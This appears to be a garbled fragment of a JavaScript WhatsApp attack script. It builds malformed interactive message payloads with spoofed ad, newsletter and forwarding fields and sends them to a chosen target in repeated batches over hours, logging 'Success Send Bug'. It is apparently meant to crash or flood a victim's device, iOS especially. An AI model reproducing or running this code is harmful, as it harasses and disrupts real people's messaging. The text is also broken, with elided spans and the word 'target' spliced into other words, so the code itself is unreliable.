  ...
  const payload = {
    interactiveMessage: {
      ...
      contextInfo: {
        ...
        isForwarded: true,
        quotedAd: {
          advertiserName: "Sttarget Revolution 👾",
          mediaType: "IMAGE",
          jpegThumbnail: cihuy,
          caption: "SOLO EtargetPOSED"
        },
        placeholderKey: {
        ...
        forwardedNewsletterMessageInfo: {
          ...
          contentType: 3,
          accessibilityText: "Fntarget Exposed"
        },
        statusAttributionType: 2,
        utm: {
          utmSource: "targetource",
          utmCampaign: "targetCampaign"
        }
      },
      body: {
  ...
  await sock.relayMessage(target, {
    interactiveMessage: {
      ...
      nativeFlowMessage: {
        ...
        async function iosOver(durationHours, target) {
            ...
            const sendNext = async () => {
                ...
                try {
                    if (count < 200) {
                        ...
                        console.log(chalk.green(`Success Send Bug to ${target} (${batch})`));
                        if (batch < maxBatches) {
                            console.log(chalk.yellow(`Justintargetatanic — 2025`));
                            count = 0;
                            batch++;
